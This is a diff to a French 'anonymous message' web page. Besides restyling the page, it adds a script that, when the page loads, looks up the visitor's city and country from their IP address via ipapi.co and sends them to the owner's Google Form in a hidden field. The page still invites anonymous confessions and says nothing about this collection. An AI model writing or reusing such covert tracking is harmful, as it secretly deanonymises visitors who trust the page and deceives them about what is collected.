@@ -2,26 +2,49 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>💌 Envoie-moi un message !</title>
+  <title>💌 Dis-moi quelque chose !</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
     body {
-      background: linear-gradient(135deg, #e0f2ff, #fbeaff);
+      background: radial-gradient(circle at top left, #250214, #013b3a);
       font-family: 'Outfit', sans-serif;
+      animation: fadeIn 1.2s ease-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .floating-heart {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      width: 100px;
+      height: 100px;
+      background: url('https://cdn-icons-png.flaticon.com/512/833/833472.png') no-repeat center/contain;
+      opacity: 0.1;
+      animation: float 6s infinite ease-in-out;
+    }
+    @keyframes float {
+      0% { transform: translate(-50%, -50%) scale(1); opacity: 0.15; }
+      50% { transform: translate(-48%, -53%) scale(1.1); opacity: 0.3; }
+      100% { transform: translate(-50%, -50%) scale(1); opacity: 0.15; }
     }
   </style>
 </head>
 <body class="flex items-center justify-center min-h-screen px-4">
-  <div class="bg-white bg-opacity-80 p-8 rounded-2xl shadow-xl max-w-lg w-full text-center">
-    <h1 class="text-3xl font-bold text-purple-700 mb-4">Tu veux m’écrire quelque chose ? 💌</h1>
-    <p class="mb-6 text-gray-700">Ton message est <strong>100 % anonyme</strong> (promis 🤐)</p>
+  <div class="floating-heart"></div>
+  <div class="glass bg-white/10 text-white backdrop-blur-xl border border-white/30 rounded-3xl shadow-2xl p-10 max-w-xl w-full text-center">
+    <h1 class="text-4xl font-extrabold mb-4">Un petit mot pour moi ? 💖💖</h1>
+    <p class="mb-6 text-white/90 text-lg">Laisse-moi une petite douceur, une question, une confession... tout est bienvenu 💌</p>
 
-    <form id="anonymous-form" action="https://docs.google.com/forms/d/e/1FAIpQLSfxxxxxxxxxxxxxxxx/formResponse" method="POST" target="hidden_iframe" onsubmit="handleSubmit()" class="space-y-4">
-      <textarea name="entry.123456789" required placeholder="Écris ce que tu veux..." class="w-full p-4 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-400"></textarea>
-      <button type="submit" class="w-full bg-purple-500 hover:bg-purple-600 text-white font-semibold py-2 px-4 rounded-xl transition">Envoyer 💌</button>
+    <form id="anonymous-form" action="https://docs.google.com/forms/d/e/1FAIpQLSdk4J4nv0mtpt9LtV5DNiD7DsiA4hVME44o0BWHt4AWB7U2qQ/formResponse" method="POST" target="hidden_iframe" onsubmit="return handleSubmit()" class="space-y-4">
+      <input name="entry.123456789" type="text" required placeholder="Ton surnom (ou rien du tout 🤫)" class="w-full p-3 bg-white/20 border border-white/30 text-white placeholder-white/70 rounded-xl focus:outline-none focus:ring-2 focus:ring-white">
+      <textarea name="entry.987654321" id="message" required placeholder="Écris ton message ici..." rows="5" class="w-full p-4 bg-white/20 border border-white/30 text-white placeholder-white/70 rounded-xl focus:outline-none focus:ring-2 focus:ring-white"></textarea>
+      <input type="hidden" name="entry.54893111" id="location-field">
+      <button type="submit" class="w-full bg-white/20 hover:bg-white/30 text-white font-semibold py-2 px-4 rounded-xl transition">Envoyer ✨</button>
     </form>
 
-    <p id="merci" class="mt-6 text-green-600 font-semibold hidden">Merci pour ton message 💖</p>
+    <p id="merci" class="mt-6 text-green-200 font-semibold hidden">Merci pour ton message, je le chérirai 💖</p>
   </div>
 
   <iframe name="hidden_iframe" style="display:none;"></iframe>
@@ -30,7 +53,23 @@
     function handleSubmit() {
       document.getElementById("anonymous-form").style.display = "none";
       document.getElementById("merci").classList.remove("hidden");
+      return true;
     }
+
+    // Récupère la position approximative via IP
+    fetch("https://ipapi.co/json/")
+      .then(response => response.json())
+      .then(data => {
+        const ville = data.city || "Ville inconnue";
+        const pays = data.country_name || "Pays inconnu";
+        const info = `Localisation: ${ville}, ${pays}`;
+
+        // Ajoute à la fin du message
+        const textarea = document.getElementById("message");
+        const locField = document.getElementById("location-field");
+
+        locField.value = info; // envoyé dans un champ masqué
+      });
   </script>
 </body>
 </html>
